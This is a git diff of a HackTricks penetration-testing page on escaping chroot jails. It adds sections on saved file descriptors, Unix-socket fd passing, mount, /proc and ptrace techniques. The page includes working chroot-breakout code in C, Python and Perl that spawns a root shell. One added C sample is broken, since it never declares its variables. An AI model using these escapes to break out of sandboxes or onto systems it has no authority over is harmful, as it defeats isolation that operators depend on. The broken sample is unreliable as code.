@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>HackTricks in </strong><a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch</strong></a> <strong>Wed - 18.30(UTC) 🎙️</strong> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>HackTricks in</strong> <a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch</strong></a> <strong>Wed - 18.30(UTC) 🎙️</strong> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
@@ -12,19 +12,33 @@
 
 </details>
 
-***
-
 ## **GTFOBins**
 
 **Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
 
-## Chroot limitation
+## Chroot Escapes
 
-From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
+From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
+Usually this means that to escape you need to be root inside the chroot.
 
-Therefore, if you are **root** inside a chroot you **can escape** creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:
+{% hint style="success" %}
+The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
+{% endhint %}
 
-{% code title="break_chroot.c" %}
+### Root + CWD
+
+{% hint style="warning" %}
+If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
+
+This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
+{% endhint %}
+
+Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
+
+<details>
+
+<summary>C: break_chroot.c</summary>
+
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -43,9 +57,12 @@ int main(void)
     system("/bin/bash");
 }
 ```
-{% endcode %}
 
-Using **python**:
+</details>
+
+<details>
+
+<summary>Python</summary>
 
 ```python
 #!/usr/bin/python
@@ -58,7 +75,11 @@ os.chroot(".")
 os.system("/bin/bash")
 ```
 
-Using **perl**:
+</details>
+
+<details>
+
+<summary>Perl</summary>
 
 ```perl
 #!/usr/bin/perl
@@ -70,6 +91,86 @@ foreach my $i (0..1000) {
 chroot ".";
 system("/bin/bash");
 ```
+
+</details>
+
+### Root + Saved fd
+
+{% hint style="warning" %}
+This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.
+{% endhint %}
+
+<details>
+
+<summary>C: break_chroot.c</summary>
+
+```c
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+//gcc break_chroot.c -o break_chroot
+
+int main(void)
+{
+    mkdir("tmpdir", 0755);
+    dir_fd = open(".", O_RDONLY);
+    if(chroot("tmpdir")){
+        perror("chroot");
+    }
+    fchdir(dir_fd);
+    close(dir_fd);  
+    for(x = 0; x < 1000; x++) chdir("..");
+    chroot(".");
+}
+```
+
+</details>
+
+### Root + Fork + UDS (Unix Domain Sockets)
+
+{% hint style="warning" %}
+FD can be passed over Unix Domain Sockets, so:
+
+* Create a child process (fork)
+* Create UDS so parent and child can talk
+* Run chroot in child process in a different folder
+* In parent proc, create a FD of a folder that is outside of new child proc chroot
+* Pass to child procc that FD using the UDS
+* Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
+{% endhint %}
+
+### &#x20;Root + Mount
+
+{% hint style="warning" %}
+* Mounting root device (/) into a directory inside the chroot
+* Chrooting into that directory
+
+This is possible in Linux
+{% endhint %}
+
+### Root + /proc
+
+{% hint style="warning" %}
+* Mount procfs into a directory inside the chroot (if it isn't yet)
+* Look for a pid that has a different root/cwd entry, like: /proc/1/root
+* Chroot into that entry
+{% endhint %}
+
+### Root(?) + Fork
+
+{% hint style="warning" %}
+* Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
+* From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
+* This children process will find himself outside of the chroot
+{% endhint %}
+
+### ptrace
+
+{% hint style="warning" %}
+* Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
+* Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap\_sys\_ptrace)).
+{% endhint %}
 
 ## Bash Jails
 
@@ -198,9 +299,13 @@ for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(
 debug.debug()
 ```
 
+## References
+
+* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
+
 <details>
 
-<summary><strong>HackTricks in </strong><a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch</strong></a> <strong>Wed - 18.30(UTC) 🎙️</strong> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>HackTricks in</strong> <a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch</strong></a> <strong>Wed - 18.30(UTC) 🎙️</strong> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
